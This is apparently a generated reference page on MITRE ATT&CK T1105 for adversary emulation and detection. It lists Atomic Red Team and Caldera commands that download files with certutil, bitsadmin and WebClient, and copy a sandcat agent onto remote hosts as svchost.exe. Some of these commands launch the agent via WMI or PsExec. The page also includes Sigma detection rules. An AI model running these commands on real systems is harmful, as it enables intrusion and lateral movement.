
# Ingress Tool Transfer

## Description

### MITRE Description

> Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1105

## Potential Commands

```
rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files

rsync -r #{local_path} #{username}@victim-host:#{remote_path}

rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}

rsync -r #{local_path} victim@#{remote_host}:#{remote_path}

rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}

rsync -r #{username}@adversary-host:#{remote_path} #{local_path}

rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files

rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}

scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/

scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}

scp #{local_file} #{username}@victim-host:#{remote_path}

scp #{local_file} victim@#{remote_host}:#{remote_path}

scp #{username}@adversary-host:#{remote_file} #{local_path}

scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/

scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}

scp adversary@#{remote_host}:#{remote_file} #{local_path}

sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'

sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'

sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'

sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'

sftp #{username}@adversary-host:#{remote_file} #{local_path}

sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/

sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}

sftp adversary@#{remote_host}:#{remote_file} #{local_path}

cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}

cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt

$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }

$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }

C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}

C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} %temp%\Atomic-license.txt

C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}

(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "#{destination_path}")

(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "$env:TEMP\Atomic-license.txt")

pushd \\localhost\C$
echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd

copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt

{'windows': {'psh': {'command': '$server="#{server}";\n$sharePath="#{share}";\nSet-Location $sharePath;$url="$($server)/file/download";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""))\n-and ([io.file]::WriteAllBytes("$($sharePath)$name.exe",$data));\n$startServer="$($sharePath)$name.exe -server $($server) ";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList "$($sharePath)$name.exe\n-server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n', 'cleanup': 'del sandcat.go-windows; Invoke-Command -ComputerName', 'payloads': ['sandcat.go-windows']}}}
{'windows': {'psh,pwsh': {'command': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  $location = "#{location}";\n  $exe = "#{exe_name}";\n  Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\\Users\\Public\\svchost.exe" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'cleanup': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item "C:\\Users\\Public\\svchost.exe" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'payloads': ['sandcat.go-windows']}}, 'darwin': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
{'windows': {'cmd': {'cleanup': 'del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe', 'command': 'net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n', 'payloads': ['sandcat.go-windows']}}}
{'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\svchost.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\svchost.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}
```

## Commands Dataset

```
[{'command': 'rsync -r #{local_path} '
             '#{username}@#{remote_host}:/tmp/victim-files\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r #{local_path} #{username}@victim-host:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r /tmp/adversary-rsync/ '
             '#{username}@#{remote_host}:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r #{local_path} victim@#{remote_host}:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r #{username}@adversary-host:#{remote_path} '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r #{username}@#{remote_host}:#{remote_path} '
             '/tmp/victim-files\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{local_file} '
             '#{username}@#{remote_host}:/tmp/victim-files/\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp /tmp/adversary-scp '
             '#{username}@#{remote_host}:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{local_file} #{username}@victim-host:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{local_file} victim@#{remote_host}:#{remote_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{username}@adversary-host:#{remote_file} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{username}@#{remote_host}:#{remote_file} '
             '/tmp/victim-files/\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp #{username}@#{remote_host}:/tmp/adversary-scp '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'scp adversary@#{remote_host}:#{remote_file} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': "sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put "
             "#{local_file}'\n",
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put "
             "/tmp/adversary-sftp'\n",
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': "sftp #{username}@victim-host:#{remote_path} <<< $'put "
             "#{local_file}'\n",
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': "sftp victim@#{remote_host}:#{remote_path} <<< $'put "
             "#{local_file}'\n",
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'sftp #{username}@adversary-host:#{remote_file} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'sftp #{username}@#{remote_host}:#{remote_file} '
             '/tmp/victim-files/\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'sftp #{username}@#{remote_host}:/tmp/adversary-sftp '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'sftp adversary@#{remote_host}:#{remote_file} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'cmd /c certutil -urlcache -split -f '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'cmd /c certutil -urlcache -split -f #{remote_file} '
             'Atomic-license.txt\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': '$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"\n'
             'New-Item -Path $datePath -ItemType Directory\n'
             'Set-Location $datePath\n'
             'certutil -verifyctl -split -f '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\n'
             'Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | '
             'Foreach-Object { Move-Item $_.Name -Destination #{local_path} '
             '}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': '$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"\n'
             'New-Item -Path $datePath -ItemType Directory\n'
             'Set-Location $datePath\n'
             'certutil -verifyctl -split -f #{remote_file}\n'
             'Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | '
             'Foreach-Object { Move-Item $_.Name -Destination '
             'Atomic-license.txt }\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority '
             'HIGH #{remote_file} #{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} '
             '/Priority HIGH #{remote_file} %temp%\\Atomic-license.txt\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} '
             '/Priority HIGH '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt '
             '#{local_path}\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': '(New-Object '
             'System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", '
             '"#{destination_path}")\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", '
             '"$env:TEMP\\Atomic-license.txt")\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'pushd \\\\localhost\\C$\n'
             'echo var fileObject = '
             'WScript.createobject("Scripting.FileSystemObject");var newfile = '
             'fileObject.CreateTextFile("AtomicTestFileT1105.js", '
             'true);newfile.WriteLine("This is an atomic red team test file '
             'for T1105. It simulates how OSTap worms accross network shares '
             'and drives.");newfile.Close(); > AtomicTestT1105.js\n'
             'CScript.exe AtomicTestT1105.js //E:JScript\n'
             'del AtomicTestT1105.js /Q >nul 2>&1\n'
             'del AtomicTestFileT1105.js /Q >nul 2>&1\n'
             'popd\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': 'copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\n'
             'C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n',
  'name': None,
  'source': 'atomics/T1105/T1105.yaml'},
 {'command': {'windows': {'psh': {'cleanup': 'del sandcat.go-windows; '
                                             'Invoke-Command -ComputerName',
                                  'command': '$server="#{server}";\n'
                                             '$sharePath="#{share}";\n'
                                             'Set-Location '
                                             '$sharePath;$url="$($server)/file/download";\n'
                                             '$wc=New-Object '
                                             'System.Net.WebClient;$wc.Headers.add("platform","windows");\n'
                                             '$wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) '
                                             '-and\n'
                                             '($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""))\n'
                                             '-and '
                                             '([io.file]::WriteAllBytes("$($sharePath)$name.exe",$data));\n'
                                             '$startServer="$($sharePath)$name.exe '
                                             '-server $($server) '
                                             '";Invoke-Command\n'
                                             '-ScriptBlock '
                                             '{Param([string]$startServer, '
                                             '$sharePath, $name, $server)  '
                                             'Invoke-WmiMethod\n'
                                             '-Class Win32_Process -Name '
                                             'Create -ArgumentList '
                                             '"$($sharePath)$name.exe\n'
                                             '-server $server -v" } '
                                             '-ComputerName '
                                             '#{remote.host.name} '
                                             '-ArgumentList $startServer, '
                                             '$sharePath, $name, $server\n',
                                  'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy Sandcat file using PowerShell',
  'source': 'data/abilities/lateral-movement/3734aa1e-c536-42b3-8912-4c91b8bdce90.yml'},
 {'command': {'darwin': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 '
                                           "#{remote.ssh.cmd} 'rm -f "
                                           "sandcat.go'\n",
                                'command': 'scp -o StrictHostKeyChecking=no -o '
                                           'UserKnownHostsFile=/dev/null -o '
                                           'ConnectTimeout=3 sandcat.go-darwin '
                                           '#{remote.ssh.cmd}:~/sandcat.go\n',
                                'payloads': ['sandcat.go-darwin']}},
              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 -o '
                                          'StrictHostKeyChecking=no '
                                          "#{remote.ssh.cmd} 'rm -f "
                                          "sandcat.go'\n",
                               'command': 'scp -o StrictHostKeyChecking=no -o '
                                          'UserKnownHostsFile=/dev/null -o '
                                          'ConnectTimeout=3 sandcat.go-linux '
                                          '#{remote.ssh.cmd}:~/sandcat.go\n',
                               'payloads': ['sandcat.go-linux']}},
              'windows': {'psh,pwsh': {'cleanup': '$job = Start-Job '
                                                  '-ScriptBlock {\n'
                                                  '  $username = '
                                                  '"#{domain.user.name}";\n'
                                                  '  $password = '
                                                  '"#{domain.user.password}";\n'
                                                  '  $secstr = New-Object '
                                                  '-TypeName '
                                                  'System.Security.SecureString;\n'
                                                  '  $password.ToCharArray() | '
                                                  'ForEach-Object '
                                                  '{$secstr.AppendChar($_)};\n'
                                                  '  $cred = New-Object '
                                                  '-Typename '
                                                  'System.Management.Automation.PSCredential '
                                                  '-Argumentlist $username, '
                                                  '$secstr;\n'
                                                  '  $session = New-PSSession '
                                                  '-ComputerName '
                                                  '"#{remote.host.name}" '
                                                  '-Credential $cred;\n'
                                                  '  Invoke-Command -Session '
                                                  '$session -Command '
                                                  '{Remove-Item '
                                                  '"C:\\Users\\Public\\svchost.exe" '
                                                  '-force};\n'
                                                  '  Start-Sleep -s 5;\n'
                                                  '  Remove-PSSession -Session '
                                                  '$session;\n'
                                                  '};\n'
                                                  'Receive-Job -Job $job '
                                                  '-Wait;\n',
                                       'command': '$job = Start-Job '
                                                  '-ScriptBlock {\n'
                                                  '  $username = '
                                                  '"#{domain.user.name}";\n'
                                                  '  $password = '
                                                  '"#{domain.user.password}";\n'
                                                  '  $secstr = New-Object '
                                                  '-TypeName '
                                                  'System.Security.SecureString;\n'
                                                  '  $password.ToCharArray() | '
                                                  'ForEach-Object '
                                                  '{$secstr.AppendChar($_)};\n'
                                                  '  $cred = New-Object '
                                                  '-Typename '
                                                  'System.Management.Automation.PSCredential '
                                                  '-Argumentlist $username, '
                                                  '$secstr;\n'
                                                  '  $session = New-PSSession '
                                                  '-ComputerName '
                                                  '"#{remote.host.name}" '
                                                  '-Credential $cred;\n'
                                                  '  $location = '
                                                  '"#{location}";\n'
                                                  '  $exe = "#{exe_name}";\n'
                                                  '  Copy-Item '
                                                  '$location.replace($exe, '
                                                  '"sandcat.go-windows") '
                                                  '-Destination '
                                                  '"C:\\Users\\Public\\svchost.exe" '
                                                  '-ToSession $session;\n'
                                                  '  Start-Sleep -s 5;\n'
                                                  '  Remove-PSSession -Session '
                                                  '$session;\n'
                                                  '};\n'
                                                  'Receive-Job -Job $job '
                                                  '-Wait;\n',
                                       'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP',
  'source': 'data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml'},
 {'command': {'windows': {'cmd': {'cleanup': 'del /f sandcat.go-windows && del '
                                             '/f '
                                             '\\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe',
                                  'command': 'net /y use '
                                             '\\\\#{remote.host.name} & copy '
                                             '/y sandcat.go-windows\n'
                                             '\\\\#{remote.host.name}\\Users\\Public '
                                             '& #{psexec.path} -accepteula '
                                             '\\\\#{remote.host.name}\n'
                                             'cmd /c start '
                                             'C:\\Users\\Public\\sandcat.go-windows '
                                             '-server #{server} -v\n',
                                  'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy Sandcat file using PsExec on CMD',
  'source': 'data/abilities/lateral-movement/620b674a-7655-436c-b645-bc3e8ea51abd.yml'},
 {'command': {'windows': {'psh': {'cleanup': '$drive = '
                                             '"\\\\#{remote.host.fqdn}\\C$";\n'
                                             'Remove-Item -Path '
                                             '$drive"\\Users\\Public\\svchost.exe" '
                                             '-Force;\n',
                                  'command': '$path = "sandcat.go-windows";\n'
                                             '$drive = '
                                             '"\\\\#{remote.host.fqdn}\\C$";\n'
                                             'Copy-Item -v -Path $path '
                                             '-Destination '
                                             '$drive"\\Users\\Public\\svchost.exe";\n',
                                  'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'edge': 'has_54ndc47_copy',
                                                                                                     'source': 'remote.host.fqdn'}]},
                                  'payloads': ['sandcat.go-windows']}}},
  'name': 'Copy 54ndc47 to remote host (SMB)',
  'source': 'data/abilities/lateral-movement/65048ec1-f7ca-49d3-9410-10813e472b30.yml'}]
```

## Potential Detections

```json
[{'data_source': {'action': 'global',
                  'author': 'Florian Roth',
                  'description': 'Detects Pandemic Windows Implant',
                  'detection': {'condition': '1 of them'},
                  'falsepositives': ['unknown'],
                  'fields': ['EventID',
                             'CommandLine',
                             'ParentCommandLine',
                             'Image',
                             'User',
                             'TargetObject'],
                  'id': '47e0852a-cf81-4494-a8e6-31864f8c86ed',
                  'level': 'critical',
                  'references': ['https://wikileaks.org/vault7/#Pandemic',
                                 'https://twitter.com/MalwareJake/status/870349480356454401'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement', 'attack.t1105'],
                  'title': 'Pandemic Registry Key'}},
 {'data_source': {'detection': {'selection1': {'EventID': 13,
                                               'TargetObject': ['\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\null\\Instance*',
                                                                '\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\services\\null\\Instance*',
                                                                '\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002\\services\\null\\Instance*']}},
                  'logsource': {'product': 'windows', 'service': 'sysmon'}}},
 {'data_source': {'detection': {'selection2': {'Command': 'loaddll -a *'}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}},
 {'data_source': {'author': 'Michael Haag (idea), Florian Roth (rule)',
                  'description': 'Detects an executable in the Windows folder '
                                 'accessing github.com',
                  'detection': {'condition': 'selection',
                                'selection': {'DestinationHostname': ['*.github.com',
                                                                      '*.githubusercontent.com'],
                                              'EventID': 3,
                                              'Image': 'C:\\Windows\\\\*',
                                              'Initiated': 'true'}},
                  'falsepositives': ['Unknown', '@subTee in your network'],
                  'id': '635dbb88-67b3-4b41-9ea5-a3af2dd88153',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://twitter.com/M_haggis/status/900741347035889665',
                                 'https://twitter.com/M_haggis/status/1032799638213066752'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement', 'attack.t1105'],
                  'title': 'Microsoft Binary Github Communication'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/08/30',
                  'description': 'Detects an executable in the Windows folder '
                                 'accessing suspicious domains',
                  'detection': {'condition': 'selection',
                                'selection': {'DestinationHostname': ['*dl.dropboxusercontent.com',
                                                                      '*.pastebin.com',
                                                                      '*.githubusercontent.com'],
                                              'EventID': 3,
                                              'Image': 'C:\\Windows\\\\*',
                                              'Initiated': 'true'}},
                  'falsepositives': ['Unknown'],
                  'id': 'e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://twitter.com/M_haggis/status/900741347035889665',
                                 'https://twitter.com/M_haggis/status/1032799638213066752'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement', 'attack.t1105'],
                  'title': 'Microsoft Binary Suspicious Communication '
                           'Endpoint'}},
 {'data_source': {'author': 'Florian Roth, juju4, keepwatch',
                  'description': 'Detects a suspicious Microsoft certutil '
                                 "execution with sub commands like 'decode' "
                                 'sub command, which is sometimes used to '
                                 'decode malicious code with the built-in '
                                 'certutil utility',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* -decode *',
                                                              '* /decode *',
                                                              '* -decodehex *',
                                                              '* /decodehex *',
                                                              '* -urlcache *',
                                                              '* /urlcache *',
                                                              '* -verifyctl *',
                                                              '* /verifyctl *',
                                                              '* -encode *',
                                                              '* /encode *',
                                                              '*certutil* '
                                                              '-URL*',
                                                              '*certutil* '
                                                              '/URL*',
                                                              '*certutil* '
                                                              '-ping*',
                                                              '*certutil* '
                                                              '/ping*']}},
                  'falsepositives': ['False positives depend on scripts and '
                                     'administrative tools used in the '
                                     'monitored environment'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'e011a729-98a6-4139-b5c4-bf6f6dd8239a',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/01/22',
                  'references': ['https://twitter.com/JohnLaTwC/status/835149808817991680',
                                 'https://twitter.com/subTee/status/888102593838362624',
                                 'https://twitter.com/subTee/status/888071631528235010',
                                 'https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/',
                                 'https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/',
                                 'https://twitter.com/egre55/status/1087685529016193025',
                                 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.t1140',
                           'attack.t1105',
                           'attack.s0189',
                           'attack.g0007'],
                  'title': 'Suspicious Certutil Command'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/26',
                  'description': 'Downloads payload from remote server',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': 'http',
                                              'Image|endswith': ['\\powerpnt.exe',
                                                                 '\\winword.exe',
                                                                 '\\excel.exe']}},
                  'falsepositives': ['Unknown'],
                  'id': '0c79148b-118e-472b-bdb7-9b57b444cc19',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml',
                                 'https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191',
                                 'Reegun J (OCBC Bank)'],
                  'status': 'experimental',
                  'tags': ['attack.command_and_control', 'attack.t1105'],
                  'title': 'Malicious payload download via Office binaries'}},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Ingress Tool Transfer': {'atomic_tests': [{'auto_generated_guid': '0fc6e977-cb12-44f6-b263-2824ba917409',
                                                                     'description': 'Utilize '
                                                                                    'rsync '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(push)\n',
                                                                     'executor': {'command': 'rsync '
                                                                                             '-r '
                                                                                             '#{local_path} '
                                                                                             '#{username}@#{remote_host}:#{remote_path}\n',
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_path': {'default': '/tmp/adversary-rsync/',
                                                                                                        'description': 'Path '
                                                                                                                       'of '
                                                                                                                       'folder '
                                                                                                                       'to '
                                                                                                                       'copy',
                                                                                                        'type': 'Path'},
                                                                                         'remote_host': {'default': 'victim-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'toward',
                                                                                                         'type': 'String'},
                                                                                         'remote_path': {'default': '/tmp/victim-files',
                                                                                                         'description': 'Remote '
                                                                                                                        'path '
                                                                                                                        'to '
                                                                                                                        'receive '
                                                                                                                        'rsync',
                                                                                                         'type': 'Path'},
                                                                                         'username': {'default': 'victim',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'rsync '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(push)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': '3180f7d5-52c0-4493-9ea0-e3431a84773f',
                                                                     'description': 'Utilize '
                                                                                    'rsync '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(pull)\n',
                                                                     'executor': {'command': 'rsync '
                                                                                             '-r '
                                                                                             '#{username}@#{remote_host}:#{remote_path} '
                                                                                             '#{local_path}\n',
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_path': {'default': '/tmp/victim-files',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
